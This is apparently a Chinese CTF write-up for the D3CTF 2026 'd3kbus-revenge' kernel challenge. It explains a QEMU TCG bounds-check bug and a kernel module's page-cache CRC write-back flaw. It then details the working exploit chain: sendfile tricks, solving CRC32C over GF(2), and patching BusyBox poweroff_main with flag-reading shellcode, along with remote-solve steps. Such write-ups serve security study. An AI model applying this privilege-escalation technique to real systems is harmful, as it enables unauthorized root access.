# d3kbus-revenge

## 题目简述

这是 `d3kbus` 的 revenge 版本。题目仍然提供 Linux 7.1.4 内核、QEMU 启动脚本、内核配置和包含 `d3kbus.ko` 的 rootfs。系统把 flag 保存为 `/flag`，权限为 `root:root 0400`，加载 `/dev/d3kbus` 后以 `ctf` 用户启动 shell。

官方 PDF 明确说明，revenge 的主要目标是修复普通版中的 QEMU TCG 非预期解；预期的 `d3kbus` page-cache CRC 回写漏洞并未修改。宿主 QEMU 不在来宾 rootfs 内，因此只做附件差分看不到这部分补丁。附件内部另有一处 `/etc/inittab` 调整，但它只是来宾启动流程的加固，也没有切断预期利用链。

本题最重要的第一步不是重新盲逆模块，而是对修复前后的附件做可信差分。结果如下：

```text
文件                  原版与 revenge 的关系
bzImage               SHA-256 完全相同
kernel_config         SHA-256 完全相同
run.sh                SHA-256 完全相同
/root/d3kbus.ko       SHA-256 完全相同
/bin/busybox          SHA-256 完全相同
/etc/init.d/rcS       SHA-256 完全相同
/etc/inittab          唯一发生内容变化的文件
```

两个模块的 SHA-256 均为：

```text
52f158bf1de001d67ec8b5a1d7b3edd1c50fb05e873db2ed6749c2f3b6fc6f4f
```

BusyBox 的 SHA-256 均为：

```text
bbc4c150f0dd092062cda5430c6e795a8fb444a75fe74f61e847db2ac58634bf
```

来宾附件中唯一可见的补丁是：

```diff
 ::sysinit:/etc/init.d/rcS
-::askfirst:/bin/login
+::askfirst:/sbin/poweroff
 ::ctrlaltdel:/sbin/reboot
 ::shutdown:/sbin/swapoff -a
 ::shutdown:/bin/umount -a -r
 ::restart:/sbin/init
```

差分证明模块中的 page-cache CRC 回写原语、BusyBox 目标和 `rcS` 触发点均保持不变。`sysinit` 动作中的 `rcS` 会先同步执行；`askfirst` 只有等 `rcS` 返回后才会运行，而 `rcS` 本身仍然会在 `ctf` shell 结束后以 root 调用 `poweroff`。因此原来的 `poweroff_main` page-cache 覆盖链仍然有效；这与宿主侧已经修复的 QEMU 非预期路径并不矛盾。

## 解题过程

### 1. 精确定位 revenge 补丁

先计算 Windows 附件哈希：

```powershell
Get-FileHash -Algorithm SHA256 `
  "D:/文档/新建文件夹/D3CTF2026/d3kbus/bzImage", `
  "D:/文档/新建文件夹/D3CTF2026/d3kbus-revenge/bzImage", `
  "D:/文档/新建文件夹/D3CTF2026/d3kbus/rootfs.qcow2", `
  "D:/文档/新建文件夹/D3CTF2026/d3kbus-revenge/rootfs.qcow2"
```

`bzImage` 相同，只有 qcow2 容器哈希不同。将两个镜像只读转换为 raw，再用 `debugfs rdump` 提取文件系统后，对所有普通文件计算相对路径加 SHA-256 的清单：

```sh
qemu-img convert -O raw rootfs.qcow2 rootfs.raw
mkdir fs
debugfs -R "rdump / fs" rootfs.raw

(cd fs && find . -type f -print0 | sort -z | xargs -0 sha256sum) > files.sha256
diff -u original-files.sha256 revenge-files.sha256
```

最终只有 `/etc/inittab` 不同。revenge 镜像本身的 SHA-256 为：

```text
318c68f6620c471121daf389ce810c6e1b0070c07916f92928463f064201e9f3
```

这一步排除了“模块增加权限检查”“BusyBox 入口偏移变化”“内核更换导致 splice 行为变化”等假设。漏洞 ABI、目标二进制和偏移都可以沿用，但必须重新审计触发时序。需要同时强调：这个差分只覆盖来宾附件，不能据此判断比赛平台使用的宿主 QEMU 是否变化。

### 2. 官方修复的 QEMU TCG 非预期路径

普通版可以绕过题目模块，直接利用 QEMU x86 TCG 的 `access_ptr()` 边界检查。旧实现使用：

```c
if (offset <= ac->size1 - len)
    return ac->haddr1 + offset;

assert(offset <= ac->size - len);
```

当 `len` 大于剩余范围时，无符号减法会下溢为一个很大的值。攻击者在页尾执行 x87 的 80 位 `FLD/FSTP`，可让 10 字节跨页访问取得越过合法 host buffer 的指针。配合 `perf_event` metadata page 和页表喷射，这条链能泄露、篡改来宾页表，形成任意物理内存读写，继而扫描内核基址、修改 `setuid` 权限检查并提权。

revenge 使用的修复先证明加数都落在范围内，再做减法：

```c
if (offset <= ac->size1 && len <= ac->size1 - offset)
    return ac->haddr1 + offset;

assert(offset <= ac->size && len <= ac->size - offset);
```

跨入第二页时还会检查 `haddr2` 是否存在。这一修复发生在比赛平台的 QEMU TCG，而不是 `d3kbus.ko` 或 rootfs 中。发现者的 [QEMU 0day 分析](https://kqx.io/post/qemu-0day/)给出了完整漏洞背景；上述内容已经概括了 revenge 所修复的触发条件、利用原语和补丁逻辑。

### 3. 为什么 inittab 改动没有挡住预期利用

`/etc/inittab` 的相关动作顺序是：

```text
BusyBox init
│
├─ SYSINIT: /etc/init.d/rcS       init 等待该脚本结束
│  │
│  ├─ insmod /root/d3kbus.ko
│  ├─ su ctf -c sh                普通用户在这里运行 exploit
│  └─ poweroff -d 0 -f            shell 返回后，以 root 运行
│
└─ ASKFIRST: /sbin/poweroff       只有 rcS 返回后才可能到达
```

`rcS` 的关键部分在两个版本中完全相同：

```sh
chown root:root /flag
chmod 0400 /flag

insmod /root/d3kbus.ko

cd /home/ctf
su ctf -c sh

poweroff -d 0 -f
```

我们的利用并不依赖原版的 `::askfirst:/bin/login`。它先把 `/bin/busybox` 的 `poweroff_main` 替换为 ORW shellcode，再杀死当前 `ctf` shell。`su ctf -c sh` 因而返回，仍处于 root 上下文中的 `rcS` 立即执行被污染的 `poweroff`，shellcode 此时已经输出 flag。

revenge 新增的 `ASKFIRST /sbin/poweroff` 位于这一事件之后。即使它最终也会调用 `poweroff_main`，也不影响 `rcS` 中第一次 root 调用。因此同一份预期 exploit 在 revenge 远程环境中无需修改即可成功。

真正有效的修复至少应满足以下一种：

- 在 `d3kbus_frame_commit_crc32c()` 中验证来源 inode/文件的写权限，并拒绝只读或不可写映射；
- 永远把 deferred CRC 写入模块私有页，不写回 external page；
- 删除 `ctf` 用户可影响、随后又会由 root 执行的 BusyBox 路径；
- 在进入不可信 shell 前预先隔离或复制 root 后续执行所用的可执行文件页面。

只改 `rcS` 完成之后的 init action，无法切断当前预期利用图。

### 4. d3kbus 协议与漏洞原语

模块保留了调试信息和符号，关键函数包括：

```text
d3kbus_ioctl_create
d3kbus_ioctl_subscribe
d3kbus_producer_splice_write
d3kbus_segment_take_external_page
d3kbus_frame_prepare_crc32c
d3kbus_frame_validate_crc32c_commit
d3kbus_frame_commit_crc32c
```

控制设备提供创建 channel 和订阅 channel 两个 ioctl：

```c
#define D3KBUS_IOC_CREATE    0xC0186101
#define D3KBUS_IOC_SUBSCRIBE 0xC0286102

struct d3kbus_ioc_create {
    uint32_t queue_limit;
    uint16_t max_subscribers;
    uint16_t flags;
    int32_t  producer_fd;       /* out */
    uint32_t channel_id;        /* out */
    uint64_t channel_cookie;    /* out */
};                              /* 24 bytes */

struct d3kbus_ioc_subscribe {
    uint64_t channel_cookie;
    uint32_t flags;
    uint32_t window_offset;
    uint32_t window_length;
    uint32_t stream_value;
    uint32_t stream_mask;
    int32_t  subscriber_fd;     /* out */
    uint32_t reserved[2];
};                              /* 40 bytes */
```

向 producer 发送的记录以 32 字节 wire header 开始：

```c
struct d3kbus_wire_header {
    uint32_t magic;             /* 0x3361626e: "nba3" */
    uint16_t header_length;     /* 32 */
    uint16_t flags;
    uint32_t payload_length;
    uint32_t stream_id;
    uint32_t user_tag;
    uint32_t reserved;
    uint64_t opaque;
} __attribute__((packed));
```

模块为订阅者构造 48 字节 projected frame header：

```c
struct d3kbus_frame_header {
    uint32_t magic;             /* 0x74747261: "artt" */
    uint16_t header_length;     /* 48 */
    uint16_t flags;
    uint32_t channel_id;
    uint32_t stream_id;
    uint64_t sequence;
    uint64_t opaque;
    uint32_t user_tag;
    uint32_t payload_length;
    uint32_t window_offset;
    uint32_t reserved;
} __attribute__((packed));
```

订阅 flags 的 `0x02` 表示 shared external，`0x04` 表示 CRC32C。设置 20 字节投影窗口后，最后 4 字节成为 deferred CRC trailer：

```text
48-byte projected header
        +
16-byte payload prefix
        +
4-byte deferred CRC32C trailer
```

payload 从普通文件经 splice 路径进入 producer 时，模块可以保留原 page-cache page 作为 external segment。它同时保存 inode、mapping、page index 和页面 snapshot。CRC commit 阶段会验证这些对象和快照仍然匹配，然后把 CRC32C 直接写入原 page：

```c
if (inode_mapping_page_index_and_snapshot_still_match(segment)) {
    address = kmap_local_page(segment->page);
    *(uint32_t *)(address + trailer_offset) = calculated_crc;
    kunmap_local(address);
}
```

问题是这段逻辑没有验证调用者对来源文件是否具有写权限。即使目标通过 `open("/bin/busybox", O_RDONLY)` 打开，普通用户仍可借 CRC trailer 修改它的 page cache，得到一个对已知文件偏移的 4 字节写。

### 5. 保留 external trailer 的三个必要条件

表面上有 CRC 选项并不代表一定会写回来源文件。要让 deferred trailer 最终仍指向原 page-cache page，需要同时满足三个不直观的条件。

| 条件 | 错误做法为何失败 | exploit 设置 |
| --- | --- | --- |
| 使用内核 direct-splice pipe | 显式 `pipe2()+splice()` 的 `pipe->files` 非零，模块降级为私有复制 | `sendfile(producer_fd, file_fd, ...)` |
| 至少两个实际订阅者 | 单订阅者发布路径会私有化 segment | `max_subscribers=2` 并调用两次 subscribe |
| 窗口是来源段的严格子区间 | 20/20 的完整窗口被私有复制 | 来源段 24 字节，投影窗口 20 字节 |

两个非管道 fd 之间调用 `sendfile()` 时，内核进入 `do_splice_direct()`，使用 `current->splice_pipe`。这个内部管道没有用户态文件描述符，满足模块接受 external page 的判断；普通用户管道则不满足。

每个 4 字节 patch 使用：

```text
channel.max_subscribers = 2
subscriber flags        = 0x02 | 0x04
window_offset           = 0
window_length           = 20
wire.payload_length     = 24
```

subscriber 不需要读取数据。发布 record 时，投影、CRC 计算和 commit 已经完成。

### 6. 反解 CRC32C，获得任意 32 位写

deferred trailer 写入的是 CRC32C，而不是直接由用户提供的值。但 `user_tag` 是 projected header 中一个完全可控的 32 位字段，也位于 CRC 覆盖范围内。

固定其余 header 和 16 字节 payload prefix，定义：

```text
F(t) = CRC32C(header(user_tag=t) || payload_prefix[0:16])
```

CRC 对输入比特是仿射映射。先计算：

```text
base    = F(0)
delta_i = F(1 << i) xor base
```

要让 CRC 等于目标 32 位值 `wanted`，只需在 GF(2) 上求解：

```text
Σ(t_i · delta_i) = wanted xor base
```

exploit 枚举 32 个输入单位向量建立线性基，再用同一组主元消去右侧。该映射在本题参数下满秩，因此任意 4 个目标字节都能找到对应的 `user_tag`。计算完成后再次执行 CRC，确认结果严格等于 `wanted`。

若想修改文件偏移 `[T,T+4)`，设置：

```text
sendfile 起始偏移 = T - 16
来源 segment 长度 = 24
投影窗口长度      = 20
```

窗口前 16 字节参与 CRC，最后 4 字节正好落在 `T`，所以一次完整操作为：

```c
pread(target_fd, window, 20, T - 16);
tag = solve_user_tag(projected_header, window[0:16], wanted_u32);

write(producer_fd, &wire_header_with_tag, 32);
sendfile(producer_fd, target_fd, &offset_T_minus_16, 24);

pread(target_fd, check, 4, T);  /* 验证 page cache 覆盖已提交 */
```

每次写入重新创建 channel 和两个订阅者，使 projected frame 的 `sequence` 保持为 1，避免队列状态改变 CRC 输入。

### 7. 覆盖 BusyBox 的 poweroff_main

两个版本使用完全相同的静态 BusyBox v1.36.0。其 `poweroff_main` 位于：

```text
虚拟地址：0x5ea059
文件偏移：0x1ea059
```

入口附近为：

```asm
0x5ea050: add rsp, 0x310
0x5ea057: pop rbp
0x5ea058: ret
0x5ea059: endbr64          ; poweroff_main
0x5ea05d: push r13
0x5ea05f: mov rdi, rsi
```

4 字节写要求偏移对齐，所以从 `0x1ea058` 开始覆盖。payload 的第一个字节为 `NOP`，真正从 `poweroff_main` 的 `0x1ea059` 进入时，会从第二个字节开始执行 shellcode。覆盖前检查以下 16 字节指纹，避免错误版本或重复运行时盲写：

```text
c3 f3 0f 1e fa 41 55 48 89 f7 41 54 55 53 31 db
```

64 字节 shellcode 共需 16 次 CRC 写，执行：

```c
fd = open("/flag", O_RDONLY);
n = read(fd, rsp - 0x80, 0x7f);
write(STDOUT_FILENO, rsp - 0x80, n);
exit(0);
```

完成 patch 后，exploit 获取父进程 pid 并发送 `SIGKILL`，让 `su ctf -c sh` 返回。root `rcS` 随即执行被替换的 `poweroff_main`。这是用户态 page-cache 数据攻击，不需要内核基址泄漏，也不受 KASLR、KPTI、SMEP、SMAP 的直接阻挡。

### 8. 编译与远程运行

`exploit.c` 不依赖 libc，只使用 x86-64 syscall。这样得到的静态 ELF 仅 8864 字节，适合通过串口 Base64 上传。

```sh
make
sha256sum exploit
```

编译结果：

```text
f3547094161a17f4681e045290d8b996373568c79bc7ea3be2f463b083b2937c  exploit
```

在 revenge 镜像上启动完整的 `init → rcS → ctf shell` 流程进行本地验证。第一次 flag 在 root `rcS` 调用 `poweroff` 时输出；随后 init 才进入修改后的 `ASKFIRST`，终端中已有的换行又使它第二次调用被污染的 `poweroff`：

```text
~ $ /tmp/d3exp
................
[+] patched; triggering root poweroff
Killed
flag{arttnba3_t3s7_f1@9!}
Please press Enter to activate this console.
flag{arttnba3_t3s7_f1@9!}
```

这段动态输出直接确认：`ASKFIRST` 在第一次 root 触发之后才生效，不能阻止 exploit。第二次输出只来自本地测试 flag，不是比赛远程 flag。

`remote_solve.py` 会：

1. 通过 TLS/SNI 连接靶机；
2. 等待真实的 `~ $ ` guest shell；
3. 将 exploit Base64 分块上传；
4. 在远端核对 SHA-256，防止串口丢字节；
5. 执行 exploit 并自动提取 `d3ctf{...}`。

运行方式：

```sh
source /home/kali/miniforge3/etc/profile.d/conda.sh
conda activate ctf-tools
python remote_solve.py <host> 443
conda deactivate
```

关键远程输出：

```text
[+] shell 就绪，上传 8864 字节 exploit
[+] 上传哈希校验通过，触发漏洞
................
[+] patched; triggering root poweroff
Killed
d3ctf{@nD-y0u_kn0W_ItS-G0Nn4-bE_ra1nINg_4nd-yOU-knOw-ItS_gonna_be_hard...0}
```

最终 flag：

```text
d3ctf{@nD-y0u_kn0W_ItS-G0Nn4-bE_ra1nINg_4nd-yOU-knOw-ItS_gonna_be_hard...0}
```

## 方法总结

revenge 版最关键的解题方法是把两个修复层次分开：官方在宿主 QEMU TCG 中修复了 `access_ptr()` 的无符号下溢，切断平台层非预期；来宾附件差分则证明内核、模块、BusyBox 和 `rcS` 都没有变化，只有 `inittab` 的后续 `askfirst` 动作从 `login` 换成 `poweroff`。预期 root 触发点位于同步执行的 `rcS` 内部，早于 `askfirst`，所以这处来宾改动不影响 CRC 覆盖链。

完整利用链为：

```text
只读打开 /bin/busybox
  → sendfile 保留 page-cache external segment
  → 两个 shared-external CRC 订阅者保留 deferred trailer
  → 用 user_tag 的 GF(2) 反解控制 CRC32C
  → 16 次 4 字节写替换 poweroff_main
  → 杀死 ctf shell
  → root rcS 先调用被污染的 poweroff
  → shellcode 输出 /flag
  → revenge 修改的 ASKFIRST 尚未开始执行
```

这道题也说明，平台漏洞和题目预期漏洞必须分别建模。QEMU 补丁只修复 TCG 跨页访存，不能代替来宾模块的权限检查；`inittab` 调整也不能修复 page-cache 任意写。若要从根本上修复预期链，应修改 `d3kbus_frame_commit_crc32c()`：外部页的完整性复核不等于写权限授权，模块不应把 CRC 回写到只读文件的 page cache。
